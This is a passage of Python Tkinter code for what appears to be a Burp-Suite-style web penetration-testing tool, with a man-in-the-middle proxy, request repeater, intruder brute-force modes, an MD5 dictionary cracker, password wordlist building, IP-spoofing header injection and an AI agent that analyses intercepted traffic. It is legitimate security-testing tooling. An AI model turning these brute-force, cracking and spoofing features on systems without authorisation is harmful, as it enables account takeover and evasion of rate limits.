        widget.insert(start, encoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_b64_decode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        decoded_text = decoder_engine.decode_base64(raw_text)
        widget.delete(start, end)
        widget.insert(start, decoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_html_encode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        encoded_text = decoder_engine.encode_html(raw_text)
        widget.delete(start, end)
        widget.insert(start, encoded_text)
    except tk.TclError:
        pass
    return "break"

def quick_html_decode(event):
    widget = event.widget
    try:
        start = widget.index("sel.first")
        end = widget.index("sel.last")
        raw_text = widget.get(start, end)
        decoded_text = decoder_engine.decode_html(raw_text)
        widget.delete(start, end)
        widget.insert(start, decoded_text)
    except tk.TclError:
        pass
    return "break"

def send_to_decoder(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_text = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        decoder_input.delete("1.0", tk.END)
        decoder_input.insert(tk.END, captured_text)
        tab_control.select(decoder_tab)
    except tk.TclError:
        print('[-] Whoops! Please highlight text to decode first')

def send_to_cracker(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_text = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        cracker_hash_entry.delete(0, tk.END)
        cracker_hash_entry.insert(0, captured_text)
        tab_control.select(cracker_tab)
    except tk.TclError:
        print('[-] Whoops! Please highlight a hash to crack first')

def send_to_repeater(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        captured_request = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        repeater_text.delete("1.0", tk.END)
        repeater_text.insert(tk.END, captured_request)
        tab_control.select(repeater_tab)
    except tk.TclError:
        print('Whoops! Please highlight your selection')

def send_to_ai(source_widget=None):
    try:
        if source_widget is None:
            source_widget = history_text
        ai_request = source_widget.get(tk.SEL_FIRST, tk.SEL_LAST)
        target = "Unknown"
        for line in ai_request.split('\n'):
            if line.lower().startswith("host"):
                target = line.split(':', 1)[1].strip()
                break
        ai_engine.event_queue.put({"event": "manual_analysis",
                                    "target": target, 
                                    "payload": ai_request
                                    })
        tab_control.select(ai_tab)
    except tk.TclError:
        print("Whoops! Please highlight your selection first.")

def browse_wordlist():
    file_path = filedialog.askopenfilename(title="Select Wordlist")
    if file_path:
        intruder_wordlist.delete(0, tk.END)
        intruder_wordlist.insert(0, file_path)

def browse_wordlist2():
    file_path = filedialog.askopenfilename(title="Select Wordlist 2")
    if file_path:
        intruder_wordlist2.delete(0, tk.END)
        intruder_wordlist2.insert(0, file_path)

def browse_cracker_wordlist():
    file_path = filedialog.askopenfilename(title="Select Dictionary")
    if file_path:
        cracker_wordlist_entry.delete(0, tk.END)
        cracker_wordlist_entry.insert(0, file_path)

def start_cracker_attack():
    target_hash = cracker_hash_entry.get().strip()
    wordlist_path = cracker_wordlist_entry.get().strip()
    if not target_hash or not wordlist_path:
        cracker_result_label.config(text="Error: Missing Hash or Wordlist", fg="red")
        return
    cracker_result_label.config(text="Cracking... Please wait", fg="blue")
    cracker_attack_btn.config(state="disabled")

    def worker():
        try:
            result = cracker_engine.crack_md5(target_hash, wordlist_path)
            if result:
                app.after(0, lambda: cracker_result_label.config(text=f"Password Found: {result}", fg="green"))
            else:
                app.after(0, lambda: cracker_result_label.config(text="Password not found in dictionary", fg="red"))
        except Exception as e:
            app.after(0, lambda: cracker_result_label.config(text=f"Error: {e}", fg="red"))
        finally:
            app.after(0, lambda: cracker_attack_btn.config(state="normal"))

    threading.Thread(target=worker, daemon=True).start()   

def clear_history():
    for item in history_tree.get_children():
        history_tree.delete(item)
    history_text.delete("1.0", tk.END)
    logger_engine.clear_log(history_file_path)

def auto_format_history():
    req = history_text.get("1.0", tk.END)
    cleaned_req =http_utils.format_history_text(req)
    history_text.delete("1.0", tk.END)
    history_text.insert("1.0", cleaned_req + "\n\n")

def set_target_scope(event=None):
    global active_scope
    active_scope = scope_entry.get().strip()
    mitm_proxy.set_scope(active_scope)
    print(f"[*] Target scope locked to: {active_scope}")
    scope_entry.config(bg="lightyellow")
    app.after(300,lambda: scope_entry.config(bg="white"))

def load_initial_history():
    refresh_history()

def check_for_new_traffic():
    try:
        while True:
            new_request = mitm_proxy.log_queue.get_nowait()
            try:
                formatted_entry = new_request + "\n==========\n"
                logger_engine.append_log(history_file_path, formatted_entry)
                lines = new_request.strip().split('\n')
                first_line = lines[0] if lines else ""
                method = first_line.split(' ')[0] if len(first_line.split(' ')) > 0 else "N/A"
                host = "Unknown"
                for line in lines:
                    if line.lower().startswith("host:"):
                        host = line.split(":", 1)[1].strip()
                        break
                req_id = len(history_tree.get_children()) + 1
                history_tree.insert('', 'end', values=(req_id, method, host, len(new_request)))
            except Exception as e:
                print(f"[-] Error processing traffic entry: {e}")
    except queue.Empty:
        pass

    app.after(250, check_for_new_traffic)

def check_intercept_queue():
    try:
        while True:
            intercepted_req = mitm_proxy.intercept_queue.get_nowait()
            intercept_text.delete("1.0", tk.END)
            intercept_text.insert(tk.END, intercepted_req)
            print("[*] GUI successfully loaded intercepted traffic")
            # Agent: classify and optionally dispatch AI analysis
            agent.process_request(intercepted_req)
    except queue.Empty:
        pass
    except Exception as e:
        print(f"[-] FATAL GUI ERROR in Intercept Loop: {e}")

    app.after(250, check_intercept_queue)

def check_intruder_queue():
    try:
        while True:
            result_data = intruder_engine.result_queue.get_nowait()
            display_values = result_data[:6] + (result_data[7],)
            full_text = result_data[6]
            tag = 'skimmer_hit' if result_data[7] not in ["None", "N/A"] else ''
            item_id = intruder_results.insert('', 'end', values=display_values, tags=(tag,))
            intruder_response_db[item_id] = full_text
            # Agent: observe result and flag notable outcomes to AI
            agent.observe_intruder_result(result_data)
    except queue.Empty:
        pass
    except Exception as e:
        print(f"[-] FATAL GUI ERROR in Intruder Loop: {e}")

    # Auto-reset button when the attack finishes naturally
    if not intruder_engine.is_running:
        intruder_attack_btn.config(text="Start Attack", bg="darkred")

    app.after(100, check_intruder_queue)

def search_repeater_response():
    response_text.tag_remove("match", "1.0", tk.END)
    search_query = repeater_search_entry.get().strip()
    if not search_query:
        return
    start_pos = "1.0"
    while True:
        start_pos = response_text.search(search_query, start_pos, stopindex=tk.END)
        if not start_pos:
            break
        end_pos = f"{start_pos}+{len(search_query)}c"
        response_text.tag_add("match", start_pos, end_pos)
        start_pos = end_pos
        response_text.tag_config("match", background="yellow", foreground="black")

def fire_payload():
    raw_request = repeater_text.get("1.0", tk.END).strip()
    result = repeater_engine.send_request(raw_request)
    response_text.delete("1.0", tk.END)
    response_text.insert(tk.END, result)
    search_repeater_response()
    # Agent: analyse the request/response pair for vulnerabilities
    agent.analyze_response(raw_request, result)
    
def render_response():
    result = response_text.get("1.0", tk.END).strip()
    if not result:
        messagebox.showinfo("Nothing to Render", "Fire a payload first.")
        return
    # Strip HTTP headers, pass only body
    if "\r\n\r\n" in result:
        body = result.split("\r\n\r\n", 1)[1]
    elif "\n\n" in result:
        body = result.split("\n\n", 1)[1]
    else:
        body = result
    html_view.load_html(body)
    response_notebook.select(render_tab)

history_label = tk.Label(history_tab, text="Intercepted Traffic", font=("Arial",12))
history_label.pack(pady=5)

scope_frame = tk.Frame(history_tab)
scope_frame.pack(pady=5)

scope_label = tk.Label(scope_frame, text="Target Scope (IP/Domain):", font=("Arial", 10))
scope_label.pack(side=tk.LEFT, padx=5)

scope_entry = tk.Entry(scope_frame, width=30, font=("Arial", 10))
scope_entry.pack(side=tk.LEFT, padx=5)

scope_entry.bind('<Return>', set_target_scope)

scope_btn = tk.Button(scope_frame, text="Set Scope", bg="lightgreen", command=set_target_scope)
scope_btn.pack(side=tk.LEFT, padx=5)

history_tree = ttk.Treeview(history_tab, columns=('ID', 'Method', 'Host', 'Length'), show='headings', height=6)
history_tree.heading('ID', text='ID')
history_tree.heading('Method', text='Method')
history_tree.heading('Host', text='Host')
history_tree.heading('Length', text='Length')

history_tree.column('ID', width=50, anchor='center')
history_tree.column('Method', width=100, anchor='center')
history_tree.column('Host', width=400, anchor='w')
history_tree.column('Length', width=100, anchor='center')

history_tree.pack(fill='x', padx=10, pady=5)
history_tree.bind("<<TreeviewSelect>>", view_request)

refresh_btn = tk.Button(history_tab, text="Refresh History", bg="darkblue", fg="white", font=("Arial", 9), command=refresh_history)
refresh_btn.pack(pady=5)

global_check = tk.Checkbutton(history_tab, text="Listen Globally (Docker/LAN)", variable=listen_global_var, font=("Arial", 9))
global_check.pack(pady=2)

proxy_btn = tk.Button(history_tab, text="Start MITM Proxy", bg="darkred", fg="white", font=("Arial", 9, "bold"), command=launch_proxy_thread)
proxy_btn.pack(pady=5)

history_text_frame = tk.Frame(history_tab)
history_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

history_scroll = tk.Scrollbar(history_text_frame)
history_scroll.pack(side=tk.RIGHT, fill=tk.Y)

history_text = tk.Text(history_text_frame, height=15, yscrollcommand=history_scroll.set)
history_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

history_scroll.config(command=history_text.yview)

history_btn_frame = tk.Frame(history_tab)
history_btn_frame.pack(fill='x', pady=5, padx=10)

send_btn = tk.Button(history_btn_frame, text="Send to Repeater -->", bg="blue", fg="white", font=("Arial", 12), command=send_to_repeater)
send_btn.grid(row=0, column=0, padx=10)

clear_btn = tk.Button(history_btn_frame, text="Clear History", bg="darkgray", font=("Arial", 12), command=clear_history)
clear_btn.grid(row=0, column=1, padx=10)

intruder_send_btn = tk.Button(history_btn_frame, text="Send to Intruder -->", bg="purple", fg="white", font=("Arial", 12), command=send_to_intruder)
intruder_send_btn.grid(row=0, column=2, padx=10)

format_history_btn = tk.Button(history_btn_frame, text="Format Request", bg="darkorange", font=("Arial", 12), command=auto_format_history)
format_history_btn.grid(row=0, column=3, padx=10)

filter_frame = tk.Frame(intercept_tab)
filter_frame.pack(pady=5)

get_var = tk.BooleanVar(value=False)
post_var = tk.BooleanVar(value=False)
put_var = tk.BooleanVar(value=False)
patch_var = tk.BooleanVar(value=False)
delete_var = tk.BooleanVar(value=False)
options_var = tk.BooleanVar(value=False)

def update_methods():
    interceptor_engine.target_methods["GET"] = get_var.get()
    interceptor_engine.target_methods["POST"] = post_var.get()
    interceptor_engine.target_methods["PUT"] = put_var.get()
    interceptor_engine.target_methods["PATCH"] = patch_var.get()
    interceptor_engine.target_methods["DELETE"] = delete_var.get()
    interceptor_engine.target_methods["OPTIONS"] = options_var.get()

get_check = tk.Checkbutton(filter_frame, text="GET", variable=get_var, command=update_methods)
get_check.pack(side=tk.LEFT, padx=5)

post_check = tk.Checkbutton(filter_frame, text="POST", variable=post_var, command=update_methods)
post_check.pack(side=tk.LEFT, padx=5)

put_check = tk.Checkbutton(filter_frame, text="PUT", variable=put_var, command=update_methods)
put_check.pack(side=tk.LEFT, padx=5)

patch_check = tk.Checkbutton(filter_frame, text="PATCH", variable=patch_var, command=update_methods)
patch_check.pack(side=tk.LEFT, padx=5)

delete_check = tk.Checkbutton(filter_frame, text="DELETE", variable=delete_var, command=update_methods)
delete_check.pack(side=tk.LEFT, padx=5)

options_check = tk.Checkbutton(filter_frame, text="OPTIONS", variable=options_var, command=update_methods)
options_check.pack(side=tk.LEFT, padx=5)

tk.Label(filter_frame, text="Path Scope:").pack(side=tk.LEFT)

path_entry = tk.Entry(filter_frame, width=20)
path_entry.pack(side=tk.LEFT, padx=5)

def update_path(event):
    interceptor_engine.target_path = path_entry.get().strip()

path_entry.bind("<KeyRelease>", update_path)

intercept_btn_frame = tk.Frame(intercept_tab)
intercept_btn_frame.pack(pady=10)

intercept_btn = tk.Button(intercept_btn_frame, text="Intercept is OFF", bg="lightgray", command=toggle_intercept)
intercept_btn.grid(row=0, column=0, padx=10)

forward_btn = tk.Button(intercept_btn_frame, text="Forward Request", bg="green", fg="white", command=forward_request)
forward_btn.grid(row=0, column=1, padx=10)

drop_btn = tk.Button(intercept_btn_frame, text="Drop Request", bg="red", fg="white", command=drop_request)
drop_btn.grid(row=0, column=2, padx=10)

intercept_text_frame = tk.Frame(intercept_tab)
intercept_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

intercept_scroll = tk.Scrollbar(intercept_text_frame)
intercept_scroll.pack(side=tk.RIGHT, fill=tk.Y)

intercept_text = tk.Text(intercept_text_frame, height=20, yscrollcommand=intercept_scroll.set)
intercept_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
intercept_scroll.config(command=intercept_text.yview)

repeater_label = tk.Label(repeater_tab, text="Ready to Modify and Fire", font=("Arial", 12))
repeater_label.pack(pady=5)

repeater_text_frame = tk.Frame(repeater_tab)
repeater_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

repeater_scroll = tk.Scrollbar(repeater_text_frame)
repeater_scroll.pack(side=tk.RIGHT, fill=tk.Y)

repeater_text = tk.Text(repeater_text_frame, height=20, yscrollcommand=repeater_scroll.set)
repeater_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

repeater_scroll.config(command=repeater_text.yview)

repeater_btn = tk.Button(repeater_tab, text="Fire Payload", bg="darkred", fg="white", font=("Arial", 12), command=fire_payload)
repeater_btn.pack(pady=15)

render_btn = tk.Button(repeater_tab, text="Render Response", bg="darkcyan", fg="white", font=("Arial", 10, "bold"), command=render_response)
render_btn.pack(pady=2)

repeater_format_btn = tk.Button(repeater_tab, text="Format Request", bg="darkorange", font=("Arial", 10, "bold"), command=auto_format_repeater)
repeater_format_btn.pack(pady=2)

response_label = tk.Label(repeater_tab, text="Server Response:", font=("Arial", 12))
response_label.pack(pady=5)

repeater_search_frame = tk.Frame(repeater_tab)
repeater_search_frame.pack(pady=2)

tk.Label(repeater_search_frame, text="Find:").pack(side=tk.LEFT)
repeater_search_entry = tk.Entry(repeater_search_frame, width=30)
repeater_search_entry.pack(side=tk.LEFT, padx=5)

repeater_search_entry.bind("<Return>", lambda e: search_repeater_response())

search_btn = tk.Button(repeater_search_frame, text="Match", command=search_repeater_response)
search_btn.pack(side=tk.LEFT)

response_notebook = ttk.Notebook(repeater_tab)
response_notebook.pack(fill='both', expand=True, padx=10, pady=5)

raw_tab = ttk.Frame(response_notebook)
render_tab = ttk.Frame(response_notebook)
response_notebook.add(raw_tab, text="Raw")
response_notebook.add(render_tab, text="Rendered")

response_text_frame = tk.Frame(raw_tab)
response_text_frame.pack(fill='both', expand=True, padx=10, pady=5)

response_scroll = tk.Scrollbar(response_text_frame)
response_scroll.pack(side=tk.RIGHT, fill=tk.Y)

response_text = tk.Text(response_text_frame, height=15, yscrollcommand=response_scroll.set)
response_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

response_scroll.config(command=response_text.yview)

html_view = SimpleHtmlRenderer(render_tab)
html_view.pack(fill='both', expand=True)
renderer_available = True

intruder_target_frame = tk.Frame(intruder_tab)
intruder_target_frame.pack(pady=5)

tk.Label(intruder_target_frame, text="Target Host:", font=("Arial", 10)).pack(side=tk.LEFT)
intruder_host = tk.Entry(intruder_target_frame, width=30)
intruder_host.pack(side=tk.LEFT, padx=5)

tk.Label(intruder_target_frame, text="Port", font=("Arial", 10)).pack(side=tk.LEFT)
intruder_port = tk.Entry(intruder_target_frame, width=8)
intruder_port.insert(0, "80")
intruder_port.pack(side=tk.LEFT, padx=5)

tk.Label(intruder_tab, text="Request Template (Use ^ to mark payload injection points)", font=("Arial", 12)).pack(pady=5)

intruder_text_frame = tk.Frame(intruder_tab)
intruder_text_frame.pack()

intruder_scroll = tk.Scrollbar(intruder_text_frame)
intruder_scroll.pack(side=tk.RIGHT, fill=tk.Y)

intruder_text = tk.Text(intruder_text_frame, height=7, width=88, yscrollcommand=intruder_scroll.set)
intruder_text.pack(side=tk.LEFT, fill=tk.BOTH)
intruder_scroll.config(command=intruder_text.yview)

intruder_payload_frame = tk.Frame(intruder_tab)
intruder_payload_frame.pack(pady=10)

tk.Label(intruder_payload_frame, text="Attack Type:", font=("Arial", 10)).grid(row=0, column=0, sticky="e", pady=2)
attack_type_var = tk.StringVar(value="Sniper")
attack_dropdown = ttk.Combobox(intruder_payload_frame, textvariable=attack_type_var, values=["Sniper", "Pitchfork", "Cluster Bomb"], state="readonly", width=15)
attack_dropdown.grid(row=0, column=1, sticky="w", padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Wordlist 1 (^1^):", font=("Arial",10)).grid(row=1, column=0, sticky="e", pady=2)
intruder_wordlist = tk.Entry(intruder_payload_frame, width=40)
intruder_wordlist.grid(row=1, column=1, padx=5, pady=2)
intruder_browse_btn = tk.Button(intruder_payload_frame, text="Browse...", command=browse_wordlist)
intruder_browse_btn.grid(row=1, column=2, padx=5)
intruder_gen_btn1 = tk.Button(intruder_payload_frame, text="Gen", bg="#2ECC71", fg="white", font=("Arial", 9, "bold"), width=6, command=lambda: open_payload_generator(intruder_wordlist, 1))
intruder_gen_btn1.grid(row=1, column=3, padx=(0, 15), sticky="w")

# rule dropdowns replaced by the step-builder panel below

tk.Label(intruder_payload_frame, text="Wordlist 2 (^2^):", font=("Arial",10)).grid(row=2, column=0, sticky="e", pady=2)
intruder_wordlist2 = tk.Entry(intruder_payload_frame, width=40)
intruder_wordlist2.grid(row=2, column=1, padx=5, pady=2)
intruder_browse_btn = tk.Button(intruder_payload_frame, text="Browse...", command=browse_wordlist2)
intruder_browse_btn.grid(row=2, column=2, padx=5)
intruder_gen_btn2 = tk.Button(intruder_payload_frame, text="Gen", bg="#2ECC71", fg="white", font=("Arial", 9, "bold"), width=6, command=lambda: open_payload_generator(intruder_wordlist2, 2))
intruder_gen_btn2.grid(row=2, column=3, padx=(0, 15), sticky="w")

# rule dropdowns replaced by the step-builder panel below

tk.Label(intruder_payload_frame, text="Match String:", font=("Arial", 10)).grid(row=3, column=0, sticky="e", pady=2)
intruder_match = tk.Entry(intruder_payload_frame, width=40)
intruder_match.grid(row=3, column=1, padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Delay (ms):", font=("Arial", 10)).grid(row=4, column=0, sticky="e", pady=2)
intruder_delay = tk.Entry(intruder_payload_frame, width=15)
intruder_delay.insert(0, "0")
intruder_delay.grid(row=4, column=1, sticky="w", padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Threads", font=("Arial", 10)).grid(row=4, column=2, sticky="e", pady=2)
intruder_threads = tk.Entry(intruder_payload_frame, width=8)
intruder_threads.insert(0, "10")
intruder_threads.grid(row=4, column=3, sticky="w")

xff_rotate_var = tk.BooleanVar(value=False)
# (retained for any legacy references; actual per-header state is in _spoof_header_vars below)

# --- Payload Processing Rules panel ---
_RULE_TYPES = [
    "Add prefix", "Add suffix",
    "Base64 Encode", "Base64 Decode",
    "MD5 Hash", "SHA-1 Hash", "SHA-256 Hash",
    "URL Encode", "URL Decode",
    "HTML Encode", "HTML Decode",
    "ASCII Encode", "SQL Hex", "JSON Encode",
    "Double URL Encode", "URL Encode All",
]
_PARAM_RULES = {"Add prefix", "Add suffix"}

def make_rule_builder(parent, label):
    """Create an ordered rule-step builder. Returns get_rules() -> list[str]."""
    lf = ttk.LabelFrame(parent, text=label, padding=(4, 2))
    lf.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=4, pady=2)

    ctrl = tk.Frame(lf)
    ctrl.pack(fill=tk.X)

    type_var = tk.StringVar(value=_RULE_TYPES[0])
    type_cb = ttk.Combobox(ctrl, textvariable=type_var, values=_RULE_TYPES, state="readonly", width=18)
    type_cb.pack(side=tk.LEFT, padx=(0, 4))

    param_label = tk.Label(ctrl, text="Value:")
    param_label.pack(side=tk.LEFT)
    param_entry = tk.Entry(ctrl, width=18)
    param_entry.pack(side=tk.LEFT, padx=(2, 4))

    # hidden listbox stores raw rule strings; display listbox shows human text
    lb_data = tk.Listbox(lf, height=0, width=0)

    def _on_type_change(*_):
        state = tk.NORMAL if type_var.get() in _PARAM_RULES else tk.DISABLED
        param_label.config(fg="black" if state == tk.NORMAL else "gray")
        param_entry.config(state=state)
    type_cb.bind("<<ComboboxSelected>>", _on_type_change)
    _on_type_change()

    def add_step():
        rt = type_var.get()
        if rt in _PARAM_RULES:
            val = param_entry.get()
            entry = f"{rt}|{val}"
            display = f"{rt}: {repr(val)}"
        else:
            entry = rt
            display = rt
        lb_data.insert(tk.END, entry)
        display_lb.insert(tk.END, display)

    tk.Button(ctrl, text="+ Add Step", bg="#2ECC71", fg="white",
              font=("Arial", 9, "bold"), command=add_step).pack(side=tk.LEFT, padx=4)

    list_frame = tk.Frame(lf)
    list_frame.pack(fill=tk.BOTH, expand=True, pady=2)

    display_lb = tk.Listbox(list_frame, height=5, width=32, exportselection=False)
    display_lb.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    sb = tk.Scrollbar(list_frame, command=display_lb.yview)
    sb.pack(side=tk.LEFT, fill=tk.Y)
    display_lb.config(yscrollcommand=sb.set)

    btn_col = tk.Frame(list_frame)
    btn_col.pack(side=tk.LEFT, padx=2)

    def move_up():
        sel = display_lb.curselection()
        if not sel or sel[0] == 0:
            return
        i = sel[0]
        for box in (lb_data, display_lb):
            val = box.get(i)
            box.delete(i)
            box.insert(i - 1, val)
            box.selection_set(i - 1)

    def move_down():
        sel = display_lb.curselection()
        if not sel or sel[0] >= display_lb.size() - 1:
            return
        i = sel[0]
        for box in (lb_data, display_lb):
            val = box.get(i)
            box.delete(i)
            box.insert(i + 1, val)
            box.selection_set(i + 1)

    def remove_step():
        sel = display_lb.curselection()
        if not sel:
            return
        for box in (lb_data, display_lb):
            box.delete(sel[0])

    def clear_steps():
        lb_data.delete(0, tk.END)
        display_lb.delete(0, tk.END)

    tk.Button(btn_col, text="\u2191", width=3, command=move_up).pack(pady=1)
    tk.Button(btn_col, text="\u2193", width=3, command=move_down).pack(pady=1)
    tk.Button(btn_col, text="\u2715", width=3, fg="red", command=remove_step).pack(pady=1)
    tk.Button(btn_col, text="Clr", width=3, command=clear_steps).pack(pady=1)

    def get_rules():
        return list(lb_data.get(0, tk.END))

    return get_rules

# rules builders are created after intruder_bottom_notebook is set up (see below)

tk.Label(intruder_payload_frame, text="Macro Setup Request:", font=("Arial", 10)).grid(row=5, column=0, sticky="ne", pady=2)
intruder_macro_req = tk.Text(intruder_payload_frame, height=4, width=55, font=("Courier", 8))
intruder_macro_req.grid(row=5, column=1, columnspan=2, sticky="w", padx=5, pady=2)

tk.Label(intruder_payload_frame, text="Macro Regex:", font=("Arial", 10)).grid(row=6, column=0, sticky="e", pady=2)
intruder_macro_reg = tk.Entry(intruder_payload_frame, width=40)
intruder_macro_reg.grid(row=6, column=1, sticky="w", padx=5, pady=2)

format_btn = tk.Button(intruder_payload_frame, text="Auto-Format", bg="darkblue", fg="white", font=("Arial", 9),  command=auto_format_request)
format_btn.grid(row=0, column=6, padx=15, sticky="ew")

intruder_attack_btn = tk.Button(intruder_payload_frame, text="Start Attack", bg="darkred", fg="white", font=("Arial", 10, "bold"), command=toggle_intruder_attack)
intruder_attack_btn.grid(row=1, column=6, rowspan=2, padx=15, sticky="ns")

# --- IP Spoofing Headers panel ---
_SPOOF_HEADER_DEFS = [
    ('X-Forwarded-For',  'X-Forwarded-For'),
    ('X-Real-IP',        'X-Real-IP'),
    ('True-Client-IP',   'True-Client-IP'),
    ('CF-Connecting-IP', 'CF-Connecting-IP'),
    ('X-Client-IP',      'X-Client-IP'),
    ('X-Originating-IP', 'X-Originating-IP'),
    ('Forwarded',        'Forwarded (RFC7239)'),
]

xff_spoof_frame = ttk.LabelFrame(
    intruder_tab,
    text="IP Spoofing Headers  —  tick to inject each header with a fresh random IP per request",
    padding=(6, 4),
)
xff_spoof_frame.pack(fill=tk.X, padx=10, pady=(0, 4))

_spoof_header_vars = {}   # {header_name: BooleanVar}
for _hdr_name, _hdr_label in _SPOOF_HEADER_DEFS:
    _var = tk.BooleanVar(value=False)
    _spoof_header_vars[_hdr_name] = _var
    tk.Checkbutton(
        xff_spoof_frame,
        text=_hdr_label,
        variable=_var,
        font=("Arial", 9),
        fg="darkred",
    ).pack(side=tk.LEFT, padx=8)

progress_var = tk.DoubleVar()
attack_progress = ttk.Progressbar(intruder_tab, variable=progress_var, maximum=100)
attack_progress.pack(fill='x', padx=20, pady=5)

intruder_bottom_notebook = ttk.Notebook(intruder_tab)
intruder_bottom_notebook.pack(pady=5, fill=tk.BOTH, expand=True)

results_tab = tk.Frame(intruder_bottom_notebook)
response_tab = tk.Frame(intruder_bottom_notebook)

intruder_bottom_notebook.add(results_tab, text="Results Table")
intruder_bottom_notebook.add(response_tab, text="Raw Response")

# --- Processing Rules tab ---
rules_tab = tk.Frame(intruder_bottom_notebook)
intruder_bottom_notebook.add(rules_tab, text="Processing Rules")
rules_outer_frame = tk.Frame(rules_tab)
rules_outer_frame.pack(fill=tk.BOTH, expand=True, padx=6, pady=4)
get_rules1 = make_rule_builder(rules_outer_frame, "Payload 1 (^1^) Processing Steps")
get_rules2 = make_rule_builder(rules_outer_frame, "Payload 2 (^2^) Processing Steps")

tree_y_scroll = tk.Scrollbar(results_tab)
tree_y_scroll.pack(side=tk.RIGHT, fill=tk.Y)
    
tree_x_scroll = tk.Scrollbar(results_tab, orient=tk.HORIZONTAL)
tree_x_scroll.pack(side=tk.BOTTOM, fill=tk.X)

columns = ('Payload', 'Status', 'Length', 'Time', 'Location', 'Match', 'Skimmer Hits')
intruder_results = ttk.Treeview(results_tab, columns=columns, show='headings', height=10, yscrollcommand=tree_y_scroll.set, xscrollcommand=tree_x_scroll.set)

tree_y_scroll.config(command=intruder_results.yview)
tree_x_scroll.config(command=intruder_results.xview)

intruder_results.heading('Payload', text='Payload', command=lambda: sort_column(intruder_results, 'Payload', False))
intruder_results.heading('Status', text='Status Code', command=lambda: sort_column(intruder_results, 'Status', False))
intruder_results.heading('Length', text='Response Length', command=lambda: sort_column(intruder_results, 'Length', False))
intruder_results.heading('Time', text='Time (ms)', command=lambda: sort_column(intruder_results, 'Time', False))
intruder_results.heading('Location', text='Redirect Location', command=lambda: sort_column(intruder_results, 'Location', False))
intruder_results.heading('Match', text='Match Found', command=lambda: sort_column(intruder_results, 'Match', False))
intruder_results.heading('Skimmer Hits', text='Skimmer Hits', command=lambda: sort_column(intruder_results, 'Skimmer Hits', False))

intruder_results.column('Payload', width=150)
intruder_results.column('Status', width=80, anchor=tk.CENTER)
intruder_results.column('Length', width=100, anchor=tk.CENTER)
intruder_results.column('Time', width=80, anchor=tk.CENTER)
intruder_results.column('Location', width=120, anchor=tk.CENTER)
intruder_results.column('Match', width=80, anchor=tk.CENTER)
intruder_results.column('Skimmer Hits', width=200, anchor=tk.W)

intruder_results.pack(fill=tk.BOTH, expand=True)

intruder_results.tag_configure('skimmer_hit', foreground='red')
intruder_results.pack(fill=tk.BOTH, expand=True)

intruder_search_frame = tk.Frame(response_tab)
intruder_search_frame.pack(pady=5)

tk.Label(intruder_search_frame, text="Find:").pack(side=tk.LEFT)
intruder_search_entry = tk.Entry(intruder_search_frame, width=30)
intruder_search_entry.pack(side=tk.LEFT, padx=5)

intruder_search_entry.bind("<Return>", lambda e: search_intruder_response())

intruder_search_btn = tk.Button(intruder_search_frame, text="Match", command=search_intruder_response)
intruder_search_btn.pack(side=tk.LEFT)

intruder_response_frame = tk.Frame(response_tab)
intruder_response_frame.pack(fill=tk.BOTH, expand=True)

intruder_response_scroll = tk.Scrollbar(intruder_response_frame)
intruder_response_scroll.pack(side=tk.RIGHT, fill=tk.Y)

intruder_response_text = tk.Text(intruder_response_frame, height=15, width=88, yscrollcommand=intruder_response_scroll.set)
intruder_response_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

intruder_response_scroll.config(command=intruder_response_text.yview)

intruder_results.bind("<<TreeviewSelect>>", view_intruder_response)

# --- Wordlist Builder tab ---
wordlist_builder_tab = tk.Frame(intruder_bottom_notebook)
intruder_bottom_notebook.add(wordlist_builder_tab, text="Wordlist Builder")

tk.Label(wordlist_builder_tab, text="Paste words below (one per line, or separated by spaces/commas). Duplicates are removed automatically.",
         font=("Arial", 9), fg="gray").pack(pady=(6, 2))

def save_wordlist(filename):
    import os
    raw = wb_text.get("1.0", tk.END)
    import re as _re
    tokens = _re.split(r'[\n,]+', raw)
    words = sorted({w.strip() for w in tokens if w.strip()})
    if not words:
        wb_status.config(text="Nothing to save.", fg="red")
        return
    save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
    with open(save_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(words))
    wb_status.config(text=f"Saved {len(words)} unique words to {filename}", fg="green")

wb_btn_frame = tk.Frame(wordlist_builder_tab)
wb_btn_frame.pack(pady=5)

tk.Button(wb_btn_frame, text="Save as passwords.txt", bg="darkred", fg="white",
          font=("Arial", 10, "bold"),
          command=lambda: save_wordlist("passwords.txt")).pack(side=tk.LEFT, padx=10)

tk.Button(wb_btn_frame, text="Save as usernames.txt", bg="navy", fg="white",
          font=("Arial", 10, "bold"),
          command=lambda: save_wordlist("usernames.txt")).pack(side=tk.LEFT, padx=10)

tk.Button(wb_btn_frame, text="Clear", font=("Arial", 10),
          command=lambda: [wb_text.delete("1.0", tk.END), wb_status.config(text="")]).pack(side=tk.LEFT, padx=10)

wb_status = tk.Label(wordlist_builder_tab, text="", font=("Arial", 9))
wb_status.pack()

wb_text_frame = tk.Frame(wordlist_builder_tab)
wb_text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

wb_scroll = tk.Scrollbar(wb_text_frame)
wb_scroll.pack(side=tk.RIGHT, fill=tk.Y)

wb_text = tk.Text(wb_text_frame, height=12, yscrollcommand=wb_scroll.set)
wb_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
